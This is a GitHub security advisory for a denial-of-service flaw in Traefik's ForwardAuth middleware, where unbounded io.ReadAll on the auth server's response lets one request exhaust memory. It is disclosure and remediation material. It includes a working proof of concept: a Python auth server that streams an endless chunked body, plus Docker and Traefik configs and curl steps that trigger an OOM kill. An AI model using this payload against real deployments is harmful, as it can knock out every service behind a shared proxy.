# [M] Traefik has unbounded io.ReadAll on auth server response body that causes OOM DOS

## Summary
Severity: Medium
Advisory: GHSA-fw45-f5q2-2p4x
CVE: CVE-2026-26998
CWE: CWE-770
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-03-04
Source: https://github.com/advisories/GHSA-fw45-f5q2-2p4x
Type: github-advisory

## Affected
- Go: `github.com/traefik/traefik/v2` — affected >=0 <2.11.38
- Go: `github.com/traefik/traefik/v3` — affected >=0 <3.6.9

## Details
## Impact

There is a potential vulnerability in Traefik managing the ForwardAuth middleware responses.

When Traefik is configured to use the ForwardAuth middleware, the response body from the authentication server is read entirely into memory without any size limit. There is no `maxResponseBodySize` configuration to restrict the amount of data read from the authentication server response. If the authentication server returns an unexpectedly large or unbounded response body, Traefik will allocate unlimited memory, potentially causing an out-of-memory (OOM) condition that crashes the process.

This results in a denial of service for all routes served by the affected Traefik instance.

## Patches

- https://github.com/traefik/traefik/releases/tag/v2.11.38
- https://github.com/traefik/traefik/releases/tag/v3.6.9

## Workarounds

No workaround available.

## For more information

If there are any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

---

<details>
<summary>Original Description</summary>

### Summary

The ForwardAuth middleware reads the entire authentication server response body into memory using io.ReadAll with no size limit. A single HTTP request through a ForwardAuth-protected route can cause the Traefik process to allocate gigabytes of memory and be killed by the OOM killer, resulting in complete denial of service for all routes on the affected entrypoint.

### Details

In pkg/middlewares/auth/forward.go, line 213:

    body, readError := io.ReadAll(forwardResponse.Body)

When the ForwardAuth middleware receives a response from the configured authentication server, it calls io.ReadAll on the response body without any size constraint. If the auth server returns a large or infinite chunked response, Traefik will attempt to buffer the entire body in memory until the process is killed.

Traefik already recognizes this class of risk for the request body direction. When forwardBody: true is configured without maxBodySize, a warning is logged (line 91-94):

    logger.Warn().Msgf("ForwardAuth 'maxBodySize' is not configured with 'forwardBody: true', allowing unlimited request body size ...")

However, the response body path has no equivalent protection — no configuration option, no warning, and no default limit. The HTTP client has a 30-second timeout (line 102), but a streaming response can deliver hundreds of megabytes per second within that window.

| Direction | Protection | Code |
|-----------|-----------|------|
| Request body to auth server | maxBodySize config + warning log | forward.go:85-95 |
| Auth server response to Traefik | None | forward.go:213 |

### PoC

1. Create a malicious auth server (auth_infinite.py):

    from http.server import BaseHTTPRequestHandler, HTTPServer

    class InfiniteAuth(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Transfer-Encoding", "chunked")
            self.end_headers()
            chunk = b"A" * (64 * 1024)
            try:
                while True:
                    self.wfile.write(f"{len(chunk):x}\r\n".encode())
                    self.wfile.write(chunk + b"\r\n")
                    self.wfile.flush()
            except BrokenPipeError:
                pass

    HTTPServer(("0.0.0.0", 9000), InfiniteAuth).serve_forever()

2. Traefik dynamic config (dynamic.yml):

    http:
      routers:
        protected:
          entryPoints: [web]
          rule: "PathPrefix('/admin')"
          middlewares: [auth]
          service: whoami
      middlewares:
        auth:
          forwardAuth:
            address: "http://auth:9000/auth"
      services:
        whoami:
          loadBalancer:
            servers:
              - url: "http://whoami:80"

3. Docker Compose (docker-compose.yml):

    services:
      traefik:
        image: traefik:v3.6
        command:
          - --entrypoints.web.address=:8000
          - --providers.file.filename=/etc/traefik/dynamic.yml
        ports:
          - "8000:8000"
        volumes:
          - ./dynamic.yml:/etc/traefik/dynamic.yml:ro
        deploy:
          resources:
            limits:
              memory: 512M
        depends_on: [auth, whoami]
      auth:
        image: python:3.12-slim
        command: ["python", "/app/auth_infinite.py"]
        volumes:
          - ./auth_infinite.py:/app/auth_infinite.py:ro
      whoami:
        image: traefik/whoami:v1.11

4. Reproduce:

    docker compose up -d
    docker stats --no-stream traefik  # ~14 MiB
    curl -s -o /dev/null http://localhost:8000/admin
    docker inspect traefik --format '{{.State.OOMKilled}}'  # true
    docker inspect traefik --format '{{.State.ExitCode}}'    # 137 (SIGKILL)

Observed results:

| Scenario | Memory |
|----------|--------|
| Idle baseline (20 seconds) | 14.8 MiB to 14.8 MiB (no change) |
| 10 normal requests (4-byte auth response) | 14.8 MiB to 15.8 MiB (+1 MiB) |
| 1 malicious request (no memory limit) | 98 MiB to 1.43 GiB (14.6x amplification) |
| 1 malicious request (512MB memory limit) | 14 MiB to OOM kill in less than 3 seconds |

After OOM kill, all routes on the entrypoint become unreachable — complete service outage.

### Impact

This is a denial-of-service vulnerability. Any Traefik instance using the ForwardAuth middleware is affected. A single HTTP request can crash the Traefik process, causing a full outage for all services behind the affected entrypoint.

Realistic attack scenarios include:

- Multi-tenant platforms where tenants configure their own ForwardAuth endpoints (SaaS, PaaS, Kubernetes ingress controllers)
- Compromised or buggy auth servers that return unexpected large responses
- Defense in depth: even trusted auth servers should not be able to crash the proxy

### Suggested Fix

Apply io.LimitReader to the auth response body, mirroring the existing maxBodySize pattern for request bodies:

    const defaultMaxAuthResponseSize int64 = 1 << 20 // 1 MiB
    limitedBody := io.LimitReader(forwardResponse.Body, defaultMaxAuthResponseSize)
    body, readError := io.ReadAll(limitedBody)

Optionally expose a maxResponseBodySize configuration option for operators who need larger auth response bodies.

</details>

## References
- https://github.com/traefik/traefik/security/advisories/GHSA-fw45-f5q2-2p4x
- https://nvd.nist.gov/vuln/detail/CVE-2026-26998
- https://github.com/traefik/traefik
- https://github.com/traefik/traefik/releases/tag/v2.11.38
- https://github.com/traefik/traefik/releases/tag/v3.6.9
